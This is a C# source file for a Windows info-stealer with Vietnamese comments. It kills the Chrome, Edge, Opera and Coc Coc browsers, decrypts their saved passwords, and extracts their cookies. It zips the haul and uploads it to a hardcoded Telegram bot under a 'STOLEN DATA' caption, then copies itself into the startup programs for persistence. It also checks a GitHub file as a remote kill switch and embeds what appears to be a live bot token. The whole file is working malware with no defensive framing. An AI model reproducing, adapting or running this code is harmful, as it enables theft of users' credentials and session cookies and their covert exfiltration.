using brbotnet.Helpers;
using brbotnet;
using Ionic.Zip;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot.Types.Enums;
using Telegram.Bot;

namespace BrBN
{
    internal class Test
    {
        public static async Task Run()
        {
            {
                string exportPath = @"C:\Intel\br";
                // Dành cho Chrome và Cốc Cốc (64-bit thường nằm ở ProgramW6432)
                var ChromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    "Google", "Chrome", "Application", "chrome.exe");

                var CocCocPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    "CocCoc", "Browser", "Application", "browser.exe");

                // Dành cho Edge (thường nằm ở Program Files (x86))
                var EdgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "Microsoft", "Edge", "Application", "msedge.exe");

                // Dành cho Opera (thường cài ở Local AppData)
                var OperaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Programs", "Opera", "opera.exe");

                string url =
                    $"https://raw.githubusercontent.com/vinhuptoday/brbn/main/{Helpers.GetUUID()}.txt?check={Guid.NewGuid().ToString()}";
                using HttpClient client = new HttpClient();
                try
                {
                    string content = await client.GetStringAsync(url);
                    if (content.Contains("off"))
                    {
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {

                }

                // Check if directory already exists
                if (!Directory.Exists(exportPath))
                {
                    Directory.CreateDirectory(exportPath);
                }

                try
                {
                    string[] browsers = { "chrome.exe", "opera.exe", "msedge.exe", "browser.exe" };

                    foreach (string browser in browsers)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "taskkill",
                            Arguments = $"/F /IM {browser}",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                    }
                }
                catch
                {
                    // ignored
                }

                try
                {
                    Directory.CreateDirectory(exportPath + @"\Chrome");
                    Directory.CreateDirectory(exportPath + @"\CocCoc");
                    Directory.CreateDirectory(exportPath + @"\Edge");
                    Directory.CreateDirectory(exportPath + @"\Opera");
                }
                catch
                {

                }

                int maxRetries = 5;
                int attempt = 0;
                bool success = false;
                dynamic c_passwords = "";
                dynamic cc_passwords = "";
                dynamic e_passwords = "";
                dynamic op_passwords = "";
                dynamic c_cookies = 0;
                dynamic cc_cookies = 0;
                dynamic e_cookies = 0;
                dynamic op_cookies = 0;
                while (attempt < maxRetries && !success)
                {
                    try
                    {
                        Decrypt decrypt = new Decrypt();
                        try
                        {
                            string[] browsers = { "chrome.exe", "opera.exe", "msedge.exe", "browser.exe" };

                            foreach (string browser in browsers)
                            {
                                Process.Start(new ProcessStartInfo
                                {
                                    FileName = "taskkill",
                                    Arguments = $"/F /IM {browser}",
                                    CreateNoWindow = true,
                                    UseShellExecute = false
                                });
                            }
                        }
                        catch
                        {
                            // ignored
                        }
                        try
                        {
                            //chrome
                            decrypt.setPath("Google", "Chrome");
                            c_passwords = await Decrypt.GetPasswords();
                            Directory.CreateDirectory(exportPath + @"\fullpass");
                            var chromePassLocation = @"C:\Intel\br\fullpass\fullpass.txt";
                            foreach (var data in c_passwords)
                            {
                                File.AppendAllText(chromePassLocation,
                                    "user: " + data.Username + "|pass: " + data.Password + "|url: " + data.Url + "\n\n");
                            }
                        }
                        catch
                        {

                        }

                        try
                        {
                            //Edge
                            decrypt.setPath("Microsoft", "Edge");
                            await Decrypt.setEncryptKey();
                            e_passwords = await Decrypt.GetPasswords();
                            Directory.CreateDirectory(exportPath + @"\fullpass");
                            var edgePassLocation = @"C:\Intel\br\fullpass\fullpass.txt";
                            foreach (var data in e_passwords)
                            {
                                File.AppendAllText(edgePassLocation,
                                    "user: " + data.Username + "|pass: " + data.Password + "|url: " + data.Url + "\n\n");
                            }
                        }
                        catch
                        {

                        }

                        try
                        {
                            //CocCoc
                            decrypt.setPath("CocCoc", "Browser");
                            await Decrypt.setEncryptKey();
                            cc_passwords = await Decrypt.GetPasswords();
                            Directory.CreateDirectory(exportPath + @"\fullpass");
                            var ccPassLocation = @"C:\Intel\br\fullpass\fullpass.txt";
                            foreach (var data in cc_passwords)
                            {
                                File.AppendAllText(ccPassLocation,
                                    "user: " + data.Username + "|pass: " + data.Password + "|url: " + data.Url + "\n\n");
                            }
                        }
                        catch
                        {

                        }

                        try
                        {
                            //Opera
                            decrypt.setPath("Opera Software", "Opera Stable");
                            await Decrypt.setEncryptKey();
                            op_passwords = await Decrypt.GetPasswords();
                            Directory.CreateDirectory(exportPath + @"\fullpass");
                            var opPassLocation = @"C:\Intel\br\fullpass\fullpass.txt";
                            foreach (var data in op_passwords)
                            {
                                File.AppendAllText(opPassLocation,
                                    "user: " + data.Username + "|pass: " + data.Password + "|url: " + data.Url + "\n\n");
                            }
                        }
                        catch
                        {

                        }

                        Decrypt2 decrypt2 = new Decrypt2();
                        try
                        {
                            string[] browsers = { "chrome.exe", "opera.exe", "msedge.exe", "browser.exe" };

                            foreach (string browser in browsers)
                            {
                                Process.Start(new ProcessStartInfo
                                {
                                    FileName = "taskkill",
                                    Arguments = $"/F /IM {browser}",
                                    CreateNoWindow = true,
                                    UseShellExecute = false
                                });
                            }
                        }
                        catch
                        {
                            // ignored
                        }
                        // chrome cookies
                        var chromeCookieLocation = @"C:\Intel\br\Chrome\chrome_cookies.txt";
                        var UserDataDir = Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                            "Google", "Chrome", "User Data");
                        if (!File.Exists(ChromePath))
                        {
                            ChromePath = Path.Combine(Environment.GetEnvironmentVariable("ProgramW6432"),
                                "Google", "Chrome", "Application", "chrome.exe");
                        }

                        if (File.Exists(ChromePath))
                        {
                            dynamic cookies =
                                JsonConvert.DeserializeObject(decrypt2.getBrowserCookies(ChromePath, UserDataDir, "9222"));
                            var jsonList = new List<object>();
                            foreach (var data in cookies.result.cookies)
                            {
                                jsonList.Add(new
                                {
                                    name = data.name,
                                    value = data.value,
                                    domain = data.domain,
                                    path = data.path,
                                    expires = data.expires,
                                    size = data.size,
                                    httpOnly = data.httpOnly,
                                    secure = data.secure,
                                    session = data.session,
                                    sameSite = data.sameSite,
                                    priority = data.priority,
                                    sameParty = data.sameParty,
                                    sourceScheme = data.sourceScheme,
                                    sourcePort = data.sourcePort
                                });
                            }

                            File.WriteAllText(chromeCookieLocation, JsonConvert.SerializeObject(jsonList));
                            c_cookies = jsonList.Count;
                        }

                        // edge cookies
                        var edgeCookieLocation = @"C:\Intel\br\Edge\edge_cookies.txt";
                        var UserEdgeDataDir = Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                            "Microsoft", "Edge", "User Data");
                        if (!File.Exists(EdgePath))
                        {
                            EdgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                                "Microsoft", "Edge", "Application", "msedge.exe");
                        }
                        if (File.Exists(EdgePath))
                        {
                            dynamic edge_cookies =
                                JsonConvert.DeserializeObject(decrypt2.getBrowserCookies(EdgePath, UserEdgeDataDir,
                                    "9223"));
                            var edgeList = new List<object>();
                            foreach (var data in edge_cookies.result.cookies)
                            {
                                edgeList.Add(new
                                {
                                    name = data.name,
                                    value = data.value,
                                    domain = data.domain,
                                    path = data.path,
                                    expires = data.expires,
                                    size = data.size,
                                    httpOnly = data.httpOnly,
                                    secure = data.secure,
                                    session = data.session,
                                    sameSite = data.sameSite,
                                    priority = data.priority,
                                    sameParty = data.sameParty,
                                    sourceScheme = data.sourceScheme,
                                    sourcePort = data.sourcePort
                                });
                            }

                            File.WriteAllText(edgeCookieLocation, JsonConvert.SerializeObject(edgeList));
                            e_cookies = edgeList.Count;
                        }

                        // coccoc cookies
                        var coccocCookieLocation = @"C:\Intel\br\CocCoc\coccoc_cookies.txt";
                        var UserCCDataDir = Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                            "CocCoc", "Browser", "User Data");
                        if (!File.Exists(CocCocPath))
                        {
                            CocCocPath = Path.Combine(Environment.GetEnvironmentVariable("ProgramW6432"),
                                "CocCoc", "Browser", "Application", "browser.exe");
                        }
                        if (File.Exists(CocCocPath))
                        {
                            dynamic coccoc_cookies =
                                JsonConvert.DeserializeObject(decrypt2.getBrowserCookies(CocCocPath, UserCCDataDir,
                                    "9224"));
                            var coccocList = new List<object>();
                            foreach (var data in coccoc_cookies.result.cookies)
                            {
                                coccocList.Add(new
                                {
                                    name = data.name,
                                    value = data.value,
                                    domain = data.domain,
                                    path = data.path,
                                    expires = data.expires,
                                    size = data.size,
                                    httpOnly = data.httpOnly,
                                    secure = data.secure,
                                    session = data.session,
                                    sameSite = data.sameSite,
                                    priority = data.priority,
                                    sameParty = data.sameParty,
                                    sourceScheme = data.sourceScheme,
                                    sourcePort = data.sourcePort
                                });
                            }

                            File.WriteAllText(coccocCookieLocation, JsonConvert.SerializeObject(coccocList));
                            cc_cookies = coccocList.Count;
                        }

                        // opera cookies
                        var operaCookieLocation = @"C:\Intel\br\Opera\opera_cookies.txt";
                        var UserOPDataDir = Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            "Opera Software", "Opera Stable");
                        if (!File.Exists(OperaPath))
                        {
                            OperaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                "Programs",
                                "Opera", "opera.exe");
                        }
                        if (File.Exists(OperaPath))
                        {
                            dynamic opera_cookies =
                                JsonConvert.DeserializeObject(decrypt2.getBrowserCookies(OperaPath, UserOPDataDir,
                                    "9225"));
                            var operaList = new List<object>();
                            foreach (var data in opera_cookies.result.cookies)
                            {
                                operaList.Add(new
                                {
                                    name = data.name,
                                    value = data.value,
                                    domain = data.domain,
                                    path = data.path,
                                    expires = data.expires,
                                    size = data.size,
                                    httpOnly = data.httpOnly,
                                    secure = data.secure,
                                    session = data.session,
                                    sameSite = data.sameSite,
                                    priority = data.priority,
                                    sameParty = data.sameParty,
                                    sourceScheme = data.sourceScheme,
                                    sourcePort = data.sourcePort
                                });
                            }

                            File.WriteAllText(operaCookieLocation, JsonConvert.SerializeObject(operaList));
                            op_cookies = operaList.Count;
                        }

                        success = true; // nếu không lỗi
                    }
                    catch
                    {
                        attempt++;
                    }
                }
                string folderToZip = exportPath;
                string outputZipFile = $@"{exportPath}\Output.zip";

                using (ZipFile zip = new ZipFile())
                {
                    zip.AddDirectory(folderToZip);
                    zip.Save(outputZipFile);
                }

                // upload to telegram bot
                string botToken = "6045157993:AAHYmtIZdAWEYzfBYHuo-MxezV3LsqHVu-8";
                long chatId = 5414980449;

                var botClient = new TelegramBotClient(botToken);

                using (var stream = new FileStream(outputZipFile, FileMode.Open, FileAccess.Read))
                {
                    var inputOnlineFile = new Telegram.Bot.Types.InputFileStream(stream, Path.GetFileName(outputZipFile));

                    await botClient.SendDocumentAsync(
                        chatId: chatId,
                        document: inputOnlineFile,
                        parseMode: ParseMode.Markdown,
                        caption: $"*BRS*\n" +
                                 $"UUID: `{Helpers.GetUUID()}`\n" +
                                 $"IP Address: `{await Helpers.GetPublicIP()}`\n" +
                                 $"User: `{Environment.UserName}`\n" +
                                 $"OS: `{Environment.OSVersion.VersionString}`\n\n" +
                                 "*STOLEN DATA*\n" +
                                 "*Chrome*\n" +
                                 $"+ Tổng cookie: {c_cookies}\n" +
                                 $"+ Tổng mật khẩu: {c_passwords.Length}\n"
                                 + "*CocCoc*\n" +
                                 $"+ Tổng cookie: {cc_cookies}\n" +
                                 $"+ Tổng mật khẩu: {cc_passwords.Length}\n" +
                                 "*Edge*\n" +
                                 $"+ Tổng cookie: {e_cookies}\n" +
                                 $"+ Tổng mật khẩu: {e_passwords.Length}\n" +
                                 "*Opera*\n" +
                                 $"+ Tổng cookie: {op_cookies} \n" +
                                 $"+ Tổng mật khẩu: {op_passwords.Length} \n" +
                                 ""
                    );
                }

                try
                {
                    if (Directory.Exists(exportPath))
                    {
                        Directory.Delete(exportPath, true);
                    }
                }
                catch
                {
                }

                try
                {
                    string currentPath = AppContext.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
                    string copyPath = @"C:\Intel\Logs";
                    string targetPath = copyPath + @"\app.exe";
                    if (!Directory.Exists(copyPath))
                    {
                        Directory.CreateDirectory(copyPath);
                    }
                    File.Copy(currentPath, targetPath, true);

                    Helpers.AddToStartup("BrsBN", targetPath);
                }
                catch { }
                try
                {
                    string[] browsers = { "chrome.exe", "opera.exe", "msedge.exe", "browser.exe" };

                    foreach (string browser in browsers)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "taskkill",
                            Arguments = $"/F /IM {browser}",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                    }
                }
                catch
                {
                    // ignored
                }
            }
        }
    }
}
